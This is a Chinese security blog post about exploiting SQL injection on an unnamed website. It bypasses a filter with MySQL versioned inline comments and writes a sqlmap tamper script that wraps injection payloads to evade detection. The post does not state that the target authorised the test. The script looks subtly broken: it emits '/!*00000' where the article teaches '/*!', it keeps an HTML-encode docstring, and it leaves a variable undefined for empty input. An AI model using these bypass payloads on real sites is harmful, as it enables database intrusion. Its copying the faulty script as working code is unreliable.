---
title: 在一次渗透中学会编写Tamper脚本
url: https://www.secpulse.com/archives/205058.html
source: 安全脉搏
date: 2025-01-23
fetch_date: 2025-10-06T20:07:09.990417
---

# 在一次渗透中学会编写Tamper脚本

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 在一次渗透中学会编写Tamper脚本

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2025-01-22

31,085

拿到这个网站，通过对比查询，我们发现

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405201505886.png)

闭合参数 finsh 时，查询出的内容更多

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405201505888.png)

经过进一步判断，确实存在漏洞

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405201505889.png)

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405201505890.png)

不过在测试的时候发现存在一定的过滤

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405201505891.png)

但是可以通过内联注释进行绕过。

这里也是加深了解了内联注释的知识点，之前只会简单的利用 `/*!50000UniON SeLeCt*/` `/*!12345union*/`不知其所以然，有这样一段解释，在 mysql 中 `/*!...*/`不是注释，mysql 为了保持兼容，它把一些特有的仅在 mysql 上用的语句放在 `/*!...*/`中，这样这些语句如果在其他数据库中是不会被执行，但是在 mysql 中它会执行。当后面接的数据库版本号小于自身版本号，就会将注释中的内容执行，当后面接的数据库版本号大于等于自身版本号，就会当做注释来处理。如下语句 `/*!50001UniON SeLeCt*/` 这里的 50001 表示假如数据库的版本是 5.00.01 及其以上版本才会被使用。这里我们会产生一个疑问，数据库的版本也不仅仅是五位数字，也存在四位，甚至于三位，应该是会进行处理 5.7.23 也对应着 5.07.23

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405201505893.png)

我们首先查询出数据库的版本信息

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405201505894.png)

当前面的数字为 50723 及小于这个数的五位数字组合都可以利用成功

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405201505895.png)

当前面的数字为 50724 及大于这个数的五位数字组合无法利用成功

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405201505896.png)

我们已经手工验证过了存在 SQL 注入漏洞，但是却无法利用 sqlmap 识别出联合注入，是因为存在检测，需要内联注释进行绕过

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405201505897.png)

我们需要编写一个Tamper脚本

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405201505898.png)

我们打开 sqlmap-master\tamper 下的一个文件 htmlencode.py 我们看到就是一个查找替换的操作

我们目前已经知道需要利用内联注释来实现绕过检测的操作

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405201505900.png)

我们修改代码

```
import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> ')

    >>> tamper("1' AND SLEEP(5)#")
    '1'/!*00000AND SLEEP(5)*/#'
    """
    if payload:
        replaced_text = payload
        replace_code = re.search(r"'(.*?)(#|--)", payload)
        if replace_code:
             replaced_text = re.sub(r"(?<=')(.*?)(?=#|--)", r"/!*00000\1*/", payload)

    return replaced_text
```

成功生效

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405201505901.png)

**本文作者：[蚁景网安实验室](newpage/author?author_id=37244)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/205058.html**](https://www.secpulse.com/archives/205058.html)

点赞：
0
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![Solon框架模板漏洞深度剖析与修复实战](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/7266edd7-a4cc-444d-bacb-7ee802487ac4.png)

  Solon框架模板漏洞深度剖析与修复实战](https://www.secpulse.com/archives/206316.html "详细阅读 Solon框架模板漏洞深度剖析与修复实战")
* [![路由器安全研究：D-Link DIR-823G v1.02 B05 复现与利用思路](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202503171628715.png)

  路由器安全研究：D-Link DIR-8](https://www.secpulse.com/archives/206007.html "详细阅读 路由器安全研究：D-Link DIR-823G v1.02 B05 复现与利用思路")
* [![DedeBIZ系统审计小结](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502121526395.png)

  DedeBIZ系统审计小结](https://www.secpulse.com/archives/205891.html "详细阅读 DedeBIZ系统审计小结")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2024/12/logo-white.png)](https://www.secpulse.com/newpage/author?author_id=37244aaa) | [蚁景网安实验室 ![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)](https://www.secpulse.com/newpage/author?author_id=37244) | |
| 文章数：402 | 积分： 877 |
| 蚁景网安实验室（www.yijinglab.com）网络安全靶场练习平台，涉及CTF赛前指导、职业技能训练、网安专项技能提升等。 | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-content/themes/secpulse2017/img/SecPulse.png)

### 活动日程

[显示更多](https://www.secpulse.com/newpage/activity)

#### 2022-06-17

[Gdevops 全球敏捷运维峰会](https://www.bagevent.com/event/8022600?bag_track=AQMB)

#### 2022-05-12

[Mastering the Challenge！——来自The 3rd AutoCS 2022智能汽车信息安全大会的邀请函](https://autocs2022.artisan-event.com/)

#### 2021-11-18

[AutoSW 2021智能汽车软件开发大会](https://autosw2021.artisan-event.com)

#### 2021-06-27

[2021中国国际网络安全博览会暨高峰论坛](http://www.sins-expo.com)

#### 2021-05-27

[The 2nd AutoCS 2021智能汽车信息安全大会](https://artisan-event.com/AutoCS2021/)

#### 2020-12-18

[贝壳找房2020 ICS安全技术峰会](https://www.4hou.com/tickets/bmZO)

#### 2020-12-11

[全球敏捷运维峰会（Gdevops2020）](https://www.bagevent.com/event/6243820?bag_track=AQMB)

#### 2020-12-04

[2020京麒网络安全大会](https://www.huodongxing.com/event/5569026023500)

#### 2020-11-29

[OPPO技术开放日第六期|聚焦应用与数据安全防护](https://mp.weixin.qq.com/s/kXt5PAD3bPcHUZjl6rziCw)

#### 2020-11-27

[EISS-2020企业信息安全峰会之上海站 11.27](https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx187be17d5a2961cf&redirect_uri=httpswww.bagevent.comevent6531722&response_type=code&scope=snsapi_userinfo&state=STATE#wechat_redirect)

#### 2020-09-24

[CSDI summit中国软件研发管理行业技术峰会](https://www.bagevent.com/event/csdisummit)

#### 2020-09-23

[2020中国国际智慧能源暨能源数据中心与网络信息安全装备展览会](http://www.energydataexpo.cn)

#### 2020-07-31

[EISS-2020企业信...